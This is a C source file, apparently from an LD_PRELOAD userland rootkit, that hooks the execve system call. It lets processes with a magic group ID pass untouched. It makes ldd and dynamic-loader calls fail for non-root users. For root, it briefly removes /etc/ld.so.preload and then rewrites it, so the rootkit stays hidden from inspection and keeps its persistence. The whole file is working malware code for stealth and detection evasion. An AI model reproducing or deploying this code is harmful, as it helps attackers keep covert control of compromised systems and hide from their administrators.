#include "father.h"

int (*o_execve)(const char *, char *const argv[], char *const envp[]);
int execve(const char *path, char *const argv[], char *const envp[]) {

	#ifdef DEBUG
	fprintf(stderr, "execve() called!\n");
	#endif

	if(!o_execve) o_execve = dlsym(RTLD_NEXT, "execve");

	if(getegid() == GID) return o_execve(path, argv, envp);

	if(strstr(path, "ldd") || strstr(path, "ld-linux-")) {

		if(geteuid() != 0) {
			errno = ECONNRESET;
			return -1;
		}

		pid_t pid;

		// uninstall
		int (*o_unlink)(const char *) = dlsym(RTLD_NEXT, "unlink");
		o_unlink("/etc/ld.so.preload");
		if((pid = fork()) == 0) {
			return o_execve(path, argv, envp);
		}

		wait(&pid);
		FILE * (*o_fopen)(const char *, const char *) =
			dlsym(RTLD_NEXT, "fopen");
		FILE * f = o_fopen("/etc/ld.so.preload", "w");
		fprintf(f, INSTALL_LOCATION);
		fclose(f);
		exit(0);
	}

	return o_execve(path, argv, envp);
}
